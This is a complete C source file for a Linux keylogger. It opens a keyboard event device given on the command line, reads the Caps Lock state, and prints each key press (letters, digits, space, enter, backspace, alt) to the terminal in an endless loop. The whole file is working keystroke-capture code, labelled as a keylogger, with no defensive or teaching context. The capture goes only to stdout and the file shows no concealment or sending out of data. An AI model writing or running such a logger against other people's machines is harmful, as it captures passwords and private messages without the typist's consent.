#include<stdio.h>
#include<stdlib.h>
#include<fcntl.h>
#include<unistd.h>
#include<linux/input.h>
#include<linux/kd.h>
#include<sys/ioctl.h>
#include<stdbool.h>
int main(int argc, char *argv[]){
	
	if(argc != 2){
		printf("usage: %s <event-name>\n",argv[0]);
		exit(-1);
	}
	
	printf("keylogger active...\n");
	printf("log: <event-name> : %s\n",argv[1]);
	
	//open the event file
	int fd;
	if((fd = open(argv[1],O_RDONLY)) == -1){
		perror("open");
		exit(-1);
	}
	printf("log: active file descriptor: %d\n",fd);	
	
	//read the event file into a buffer
	struct input_event ie;
	
	/*
	 *	KDGKBLED is not giving proper flag states when used with /dev/tty3 or any vc
	 *
	 *
	//get caps lock flag state
	int vc;
	if( (vc = open("/dev/tty3",O_RDONLY)) == -1 ){
		perror("open");
		exit(-1);
	}
	else
		printf("log: active file descriptor: %d\n",vc);
	*/
	bool MODE_UPPERCASE;
	char arg;
	//get CAPS_LOCK state
	if(ioctl(fd,EVIOCGLED(sizeof(arg)),&arg) == -1){
		perror("EVIOCGLED");
		close(fd);
		exit(-1);
	} else{
		MODE_UPPERCASE = (arg >> LED_CAPSL) & 1;
	}
	printf("log: (flag)CAPS_LOCK_ENABLED:%d\n",MODE_UPPERCASE);


	while(1){

		int rd_bytes = read(fd,&ie,sizeof(ie));
		
		
		if(ie.value==1){
			
			if(ie.code==2)
				printf("1");
			if(ie.code==3)
				printf("2");
			if(ie.code==4)
				printf("3");
			if(ie.code==5)
				printf("4");
			if(ie.code==6)
				printf("5");
			if(ie.code==7)
				printf("6");
			if(ie.code==8)
				printf("7");
			if(ie.code==9)
				printf("8");
			if(ie.code==10)
				printf("9");
			if(ie.code==11)
				printf("0");

			
			if(ie.code==16)
				printf(MODE_UPPERCASE ? "Q":"q");
			if(ie.code==17)
				printf(MODE_UPPERCASE ? "W":"w");
			if(ie.code==18)
				printf(MODE_UPPERCASE ? "E":"e");
			if(ie.code==19)
				printf(MODE_UPPERCASE ? "R":"r");
			if(ie.code==20)
				printf(MODE_UPPERCASE ? "T":"t");
			if(ie.code==21)
				printf(MODE_UPPERCASE ? "Y":"y");
			if(ie.code==22)
				printf(MODE_UPPERCASE ? "U":"u");
			if(ie.code==23)
				printf(MODE_UPPERCASE ? "I":"i");
			if(ie.code==24)
				printf(MODE_UPPERCASE ? "O":"o");
			if(ie.code==25)
				printf(MODE_UPPERCASE ? "P":"p");

			if(ie.code==30)
				printf(MODE_UPPERCASE ? "A":"a");
			if(ie.code==31)
				printf(MODE_UPPERCASE ? "S":"s");
			if(ie.code==32)
				printf(MODE_UPPERCASE ? "D":"d");
			if(ie.code==33)
				printf(MODE_UPPERCASE ? "F":"f");
			if(ie.code==34)
				printf(MODE_UPPERCASE ? "G":"g");
			if(ie.code==35)
				printf(MODE_UPPERCASE ? "H":"h");
			if(ie.code==36)
				printf(MODE_UPPERCASE ? "J":"j");
			if(ie.code==37)
				printf(MODE_UPPERCASE ? "K":"k");
			if(ie.code==38)
				printf(MODE_UPPERCASE ? "L":"l");

			if(ie.code==44)
				printf(MODE_UPPERCASE ? "Z":"z");
			if(ie.code==45)
				printf(MODE_UPPERCASE ? "X":"x");
			if(ie.code==46)
				printf(MODE_UPPERCASE ? "C":"c");
			if(ie.code==47)
				printf(MODE_UPPERCASE ? "V":"v");
			if(ie.code==48)
				printf(MODE_UPPERCASE ? "B":"b");
			if(ie.code==49)
				printf(MODE_UPPERCASE ? "N":"n");
			if(ie.code==50)
				printf(MODE_UPPERCASE ? "M":"m");

			if(ie.code==57)
				printf(" ");
			if(ie.code==14)
				printf("⌫");
			if(ie.code==28)
				printf("⏎");
			if(ie.code==56)
				printf("⎇");
			if(ie.code==58)
				MODE_UPPERCASE = !MODE_UPPERCASE;
		}

		fflush(stdout);
	}
	return 0;
}
